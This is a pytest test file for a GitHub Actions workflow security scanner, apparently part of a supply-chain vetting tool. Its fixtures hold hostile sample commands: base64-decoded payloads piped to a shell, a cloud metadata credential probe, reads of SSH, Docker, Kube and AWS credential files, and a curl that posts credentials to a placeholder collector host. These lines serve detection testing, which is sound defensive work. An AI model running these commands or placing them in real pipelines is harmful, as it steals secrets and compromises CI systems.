from __future__ import annotations

import json

import pytest
from click.testing import CliRunner

from ca9.analyzers.github_actions import analyze_github_actions_workflows
from ca9.cli import main
from ca9.inventory import build_inventory
from ca9.supply_chain import build_supply_chain_report, supply_chain_report_to_table


def test_github_actions_analyzer_flags_pull_request_target_pr_checkout(tmp_path):
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "bundle-size.yml").write_text(
        """
on:
  pull_request_target:

jobs:
  benchmark:
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - run: pnpm nx run @benchmarks/bundle-size:build
""".strip()
    )

    findings = analyze_github_actions_workflows(tmp_path)

    assert any(
        finding.signal_type == "github_actions_pull_request_target_checkout" for finding in findings
    )
    checkout = next(
        finding
        for finding in findings
        if finding.signal_type == "github_actions_pull_request_target_checkout"
    )
    assert checkout.severity == "critical"
    assert checkout.metadata["action"] == "block"


def test_github_actions_analyzer_flags_oidc_and_write_permissions(tmp_path):
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "release.yml").write_text(
        """
on:
  push:
    branches: [main]

permissions:
  contents: write
  id-token: write

jobs:
  release:
    steps:
      - uses: actions/checkout@v6.0.2
      - run: pnpm test
""".strip()
    )

    signal_types = {finding.signal_type for finding in analyze_github_actions_workflows(tmp_path)}

    assert "github_actions_oidc_write" in signal_types
    assert "github_actions_write_permissions" in signal_types


def test_github_actions_analyzer_flags_ci_credential_harvest_payloads(tmp_path):
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "optimize-build.yml").write_text(
        """
on:
  push:
    branches: [main]

jobs:
  optimize:
    steps:
      - run: |
          echo "Y3VybCAtZnNTIGh0dHBzOi8vZXhhbXBsZS5jb20K" | base64 -d | bash
          curl -fsS http://169.254.169.254/latest/meta-data/iam/security-credentials/
          cat ~/.ssh/id_rsa ~/.docker/config.json ~/.kube/config
""".strip()
    )

    findings = analyze_github_actions_workflows(tmp_path)
    signal_types = {finding.signal_type for finding in findings}

    assert "github_actions_encoded_shell_payload" in signal_types
    assert "github_actions_cloud_metadata_probe" in signal_types
    assert "github_actions_credential_file_harvest" in signal_types
    encoded_payload = next(
        finding
        for finding in findings
        if finding.signal_type == "github_actions_encoded_shell_payload"
    )
    assert encoded_payload.severity == "critical"
    assert encoded_payload.metadata["action"] == "block"


def test_vet_table_gives_workflow_backdoor_next_steps(tmp_path):
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "optimize-build.yml").write_text(
        """
on:
  push:

jobs:
  optimize:
    steps:
      - run: echo "Y3VybAo=" | base64 -d | bash
""".strip()
    )

    findings = analyze_github_actions_workflows(tmp_path)
    report = build_supply_chain_report(build_inventory(tmp_path), extra_findings=findings)

    table = supply_chain_report_to_table(report)

    assert (
        "Why: base64-decoded shell payloads are a common CI credential-stealing technique" in table
    )
    assert (
        "Next: block the change and inspect recent workflow runs for credential exposure" in table
    )


def test_vet_cli_can_scan_workflows(tmp_path):
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "token-access-review.yml").write_text(
        """
on:
  workflow_dispatch:

permissions:
  contents: write
  actions: write
  id-token: write

jobs:
  review:
    steps:
      - uses: actions/checkout@v6.0.2
      - run: gh repo clone example/private-repo
""".strip()
    )

    runner = CliRunner()
    result = runner.invoke(main, ["vet", "--repo", str(tmp_path), "--scan-workflows", "-f", "json"])

    assert result.exit_code == 1
    data = json.loads(result.output)
    signal_types = {finding["signal_type"] for finding in data["findings"]}
    assert "github_actions_oidc_write" in signal_types
    assert "github_actions_source_clone" in signal_types


def _workflow_findings(tmp_path, content, name="workflow.yml"):
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True, exist_ok=True)
    (workflow_dir / name).write_text(content.strip() + "\n")
    return analyze_github_actions_workflows(tmp_path)


def _by_signal(findings):
    return {finding.signal_type: finding for finding in findings}


@pytest.mark.parametrize(
    "trigger",
    [
        "on: pull_request_target",
        "on: [push, pull_request_target]",
        "'on': {pull_request_target: {types: [opened]}}",
        "on:\n  - push\n  - pull_request_target",
        "on:\n- pull_request_target",
        "on:\n  push:\n  pull_request_target:\n    types: [opened]",
    ],
)
def test_pull_request_target_trigger_forms_are_recognized(tmp_path, trigger):
    findings = _workflow_findings(
        tmp_path,
        trigger + "\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make\n",
    )

    assert "github_actions_pull_request_target" in _by_signal(findings)


@pytest.mark.parametrize(
    "checkout",
    [
        "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.head_ref }}",
        "      - uses: actions/checkout@v4\n        with:\n"
        "          ref: ${{ github.event.pull_request.head.ref }}",
        "      - run: gh pr checkout ${{ github.event.number }}",
        "      - run: |\n          git fetch origin pull/${{ github.event.number }}/head:pr\n"
        "          git checkout pr",
        "      - run: git checkout ${{ github.event.pull_request.head.sha }}",
    ],
)
def test_pull_request_head_checkout_forms_are_critical(tmp_path, checkout):
    findings = _workflow_findings(
        tmp_path,
        "on: pull_request_target\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n" + checkout,
    )

    finding = _by_signal(findings)["github_actions_pull_request_target_checkout"]
    assert (finding.severity, finding.metadata["action"]) == ("critical", "block")


def test_head_ref_in_concurrency_group_is_not_a_checkout(tmp_path):
    findings = _workflow_findings(
        tmp_path,
        """
on: pull_request_target
concurrency:
  group: ${{ github.workflow }}-${{ github.head_ref || github.run_id }}
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.base.sha }}
      - uses: actions/labeler@8558fd74291d67161a8a78ce36a881fa63b766a9
        with:
          sha: ${{ github.event.pull_request.head.sha }}
""",
    )

    signals = _by_signal(findings)
    assert "github_actions_pull_request_target_checkout" not in signals
    assert signals["github_actions_pull_request_target"].metadata["action"] == "investigate"


def test_workflow_run_checkout_of_pr_head_is_blocked(tmp_path):
    findings = _workflow_findings(
        tmp_path,
        """
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
jobs:
  report:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.workflow_run.head_sha }}
      - run: npm ci && npm test
""",
    )

    finding = _by_signal(findings)["github_actions_untrusted_checkout"]
    assert (finding.severity, finding.metadata["action"]) == ("critical", "block")


def test_workflow_run_artifact_consumption_is_investigated(tmp_path):
    findings = _workflow_findings(
        tmp_path,
        """
on:
  workflow_run:
    workflows: [CI]
jobs:
  report:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          run-id: ${{ github.event.workflow_run.id }}
      - run: bash ./artifact/report.sh
""",
    )

    assert _by_signal(findings)["github_actions_workflow_run_artifact"].severity == "high"


def test_comments_and_echo_text_do_not_produce_findings(tmp_path):
    findings = _workflow_findings(
        tmp_path,
        """
name: docs
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # we used to git clone the docs repo here
      - name: Explain why we no longer run git clone
        run: |
          # cat ~/.aws/credentials is never needed
          echo "AWS creds live in ~/.aws/credentials, never cat them"
          printf '%s\\n' 'metadata is at 169.254.169.254'
          make docs  # not git clone
""",
    )

    assert findings == []


def test_echo_with_command_substitution_still_counts(tmp_path):
    findings = _workflow_findings(
        tmp_path,
        """
on: push
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$(cat ~/.aws/credentials)" | curl -d @- https://collector.example
""",
    )

    assert "github_actions_credential_file_harvest" in _by_signal(findings)


def test_action_references_are_checked_in_every_uses_position(tmp_path):
    findings = _workflow_findings(
        tmp_path,
        """
on: push
jobs:
  call:
    uses: someorg/shared/.github/workflows/build.yml@main
  build:
    runs-on: ubuntu-latest
    steps:
      - name: changed files
        uses: tj-actions/changed-files@v45
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
      - uses: actions/setup-node@main
      - uses: someorg/pinned@0123456789abcdef0123456789abcdef01234567 # v1.2.3
      - uses: ./.github/actions/local
      - uses: docker://alpine:3.20
""",
    )

    refs = {
        (finding.signal_type, finding.metadata["action_ref"], finding.metadata["action"])
        for finding in findings
    }
    assert refs == {
        (
            "github_actions_mutable_action_ref",
            "someorg/shared/.github/workflows/build.yml@main",
            "investigate",
        ),
        ("github_actions_mutable_action_ref", "actions/setup-node@main", "investigate"),
        ("github_actions_unpinned_action", "tj-actions/changed-files@v45", "warn"),
    }


@pytest.mark.parametrize(
    ("trigger", "action"),
    [
        ("on:\n  issues:\n    types: [opened]\n  issue_comment:", "block"),
        ("on: pull_request", "warn"),
    ],
)
def test_untrusted_expression_in_run_is_template_injection(tmp_path, trigger, action):
    findings = _workflow_findings(
        tmp_path,
        trigger
        + """
jobs:
  triage:
    runs-on: ubuntu-latest
    env:
      SAFE_TITLE: ${{ github.event.issue.title }}
    steps:
      - name: ${{ github.event.issue.title }}
        run: |
          echo "Title: ${{ github.event.issue.title }}"
          echo "$SAFE_TITLE"
      - run: echo "${{ github.head_ref }}"
      - run: echo "${{ github.event.pull_request.base.ref }} ${{ github.event.issue.number }}"
""",
    )

    injections = [
        finding
        for finding in findings
        if finding.signal_type == "github_actions_template_injection"
    ]
    lines = {finding.metadata["line"] for finding in injections}
    offset = trigger.count("\n")
    assert lines == {10 + offset, 12 + offset}
    assert {finding.metadata["action"] for finding in injections} == {action}
    assert {finding.severity for finding in injections} == {"high"}


def test_oidc_write_is_downgraded_without_untrusted_triggers(tmp_path):
    release = _by_signal(
        _workflow_findings(
            tmp_path / "release",
            "on:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\njobs: {}\n",
        )
    )["github_actions_oidc_write"]
    untrusted = _by_signal(
        _workflow_findings(
            tmp_path / "untrusted",
            "on: issue_comment\npermissions:\n  id-token: write\njobs: {}\n",
        )
    )["github_actions_oidc_write"]

    assert (release.severity, release.metadata["action"]) == ("low", "warn")
    assert (untrusted.severity, untrusted.metadata["action"]) == ("high", "investigate")


def test_composite_actions_are_scanned(tmp_path):
    action_dir = tmp_path / ".github" / "actions" / "setup"
    action_dir.mkdir(parents=True)
    (action_dir / "action.yml").write_text(
        """
name: setup
runs:
  using: composite
  steps:
    - uses: evil/setup-thing@main
    - run: cat payload.txt | base64 -d | sh
      shell: bash
"""
    )
    (tmp_path / "action.yaml").write_text(
        "runs:\n  using: composite\n  steps:\n    - uses: other/thing@v1\n"
    )

    findings = analyze_github_actions_workflows(tmp_path)

    by_path = {(finding.metadata["workflow_path"], finding.signal_type) for finding in findings}
    assert (".github/actions/setup/action.yml", "github_actions_mutable_action_ref") in by_path
    assert (".github/actions/setup/action.yml", "github_actions_encoded_shell_payload") in by_path
    assert ("action.yaml", "github_actions_unpinned_action") in by_path


def test_workflow_findings_print_their_location(tmp_path):
    findings = _workflow_findings(
        tmp_path,
        "on: push\njobs:\n  a:\n    steps:\n      - run: echo 'eA==' | base64 -d | sh\n",
        name="ci.yml",
    )
    report = build_supply_chain_report(build_inventory(tmp_path), extra_findings=findings)

    table = supply_chain_report_to_table(report)

    assert ".github/workflows/ci.yml:5" in table
    assert "@unknown" not in table


@pytest.mark.parametrize(
    ("content", "expected"),
    [
        ("on: push\npermissions:\n  contents: write\njobs: {}\n", ("high", "block")),
        ("on: push\npermissions: write-all\njobs: {}\n", ("high", "block")),
        (
            "on: push\npermissions:\n  contents: read\njobs:\n  release:\n"
            "    permissions:\n      contents: write\n    steps: []\n",
            ("medium", "warn"),
        ),
        (
            "on: issue_comment\njobs:\n  reply:\n    permissions:\n"
            "      contents: write\n    steps: []\n",
            ("high", "block"),
        ),
    ],
)
def test_write_permission_severity_follows_scope_and_trigger(tmp_path, content, expected):
    finding = _by_signal(_workflow_findings(tmp_path, content))["github_actions_write_permissions"]

    assert (finding.severity, finding.metadata["action"]) == expected
